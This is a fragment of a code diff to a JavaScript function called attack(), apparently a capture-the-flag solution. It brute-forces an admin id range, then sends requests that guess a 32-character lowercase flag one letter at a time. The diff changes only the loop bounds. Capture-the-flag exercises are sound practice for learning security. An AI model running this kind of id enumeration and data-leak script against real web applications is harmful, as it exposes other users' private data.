@@ -41,7 +41,7 @@ async function checkId(id) {
 async function attack() {
     let noteName = "";
     let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn"; //the flag is supposed to be composed of only lowercase letters
-    for (let i = 10000; i < 100000; i++) {
+    for (let i = 100000; i < 200000; i++) {
         //retrieve admin id
         try {
             await checkId(i);
@@ -51,7 +51,7 @@ async function attack() {
     
         //find final name
         if (adminId != -1) {
-            i = 10001;
+            i = 1000000001;
             sendRequest(`adminId=${adminId}`)
             //suposing the flag is 32 characters long
             while (noteName.length < 32) {
